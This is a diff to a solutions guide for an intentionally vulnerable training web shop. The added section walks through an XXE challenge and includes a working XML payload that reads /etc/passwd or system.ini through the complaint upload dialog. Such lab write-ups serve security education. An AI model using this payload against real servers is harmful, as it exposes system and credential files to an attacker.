@@ -362,7 +362,41 @@ in order to exploit and solve them:
 
 ### Retrieve the content of C:\Windows\system.ini or /etc/passwd from the server
 
-:wrench: **TODO**
+1. Solve the
+   [Use a deprecated B2B interface that was not properly shut down](#use-a-deprecated-b2b-interface-that-was-not-properly-shut-down)
+   challenge.
+2. Prepare an XML file which defines and uses an external entity
+   `<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>` (or `<!ENTITY xxe
+   SYSTEM "file:///C:/Windows/system.ini" >]>` on Windows).
+3. Upload this file through the _File Complaint_ dialog and observe the
+   Javascript console while doing so. It should give you an error
+   message containing the parsed XML, including the contents of the
+   local system file!
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!DOCTYPE foo [<!ELEMENT foo ANY >
+        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+
+<trades>
+    <metadata>
+        <name>Apple Juice</name>
+        <trader>
+            <foo>&xxe;</foo>
+            <name>B. Kimminich</name>
+        </trader>
+        <units>1500</units>
+        <price>106</price>
+        <name>Lemon Juice</name>
+        <trader>
+            <name>B. Kimminich</name>
+        </trader>
+        <units>4500</units>
+        <price>195</price>
+    </metadata>
+</trades>
+```
 
 ### Log in with Jim's user account
 
